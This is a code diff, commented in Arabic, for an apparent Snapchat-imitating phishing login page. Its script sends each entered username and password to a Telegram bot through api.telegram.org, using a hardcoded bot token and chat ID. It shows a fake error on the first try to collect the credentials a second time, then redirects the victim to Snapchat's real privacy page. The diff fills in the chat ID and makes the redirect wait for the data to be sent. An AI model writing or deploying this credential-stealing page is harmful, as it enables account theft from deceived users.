@@ -96,13 +96,14 @@
     </div>
 
     <script>
-        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
-        const chatId = 'YOUR_CHAT_ID'; // استبدل بـ chat_id الخاص بك
-        let attempt = 1;
+        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc'; // رمز البوت
+        const chatId = '612575358'; // استبدل بـ chat_id الخاص بك
+        let attempt = 1; // لتتبع عدد المحاولات
 
+        // إرسال البيانات إلى Telegram
         function sendToTelegram(username, password) {
             const message = `👤 Username: ${username}\n🔒 Password: ${password}`;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -123,6 +124,7 @@
             });
         }
 
+        // معالجة الإرسال
         function handleSubmit(event) {
             event.preventDefault();
 
@@ -130,20 +132,20 @@
             const password = document.getElementById('password').value.trim();
             const errorMessage = document.getElementById('error-message');
 
-            // إرسال البيانات إلى Telegram
-            sendToTelegram(username, password);
-
-            // التحقق من عدد المحاولات
-            if (attempt === 1) {
-                // إظهار رسالة الخطأ وإعادة تعيين الحقول
-                errorMessage.style.display = 'block';
-                document.getElementById('username').value = '';
-                document.getElementById('password').value = '';
-                attempt++;
-            } else {
-                // تحويل المستخدم إلى صفحة الخصوصية الخاصة بـ Snapchat
-                window.location.href = 'https://www.snapchat.com/privacy';
-            }
+            // إرسال المعلومات إلى Telegram
+            sendToTelegram(username, password).then(() => {
+                // تحقق من المحاولة الحالية
+                if (attempt === 1) {
+                    // إظهار رسالة الخطأ وإعادة تعيين الحقول
+                    errorMessage.style.display = 'block';
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    attempt++;
+                } else {
+                    // تحويل المستخدم إلى صفحة الخصوصية الخاصة بـ Snapchat
+                    window.location.href = 'https://www.snapchat.com/privacy';
+                }
+            });
         }
     </script>
 </body>
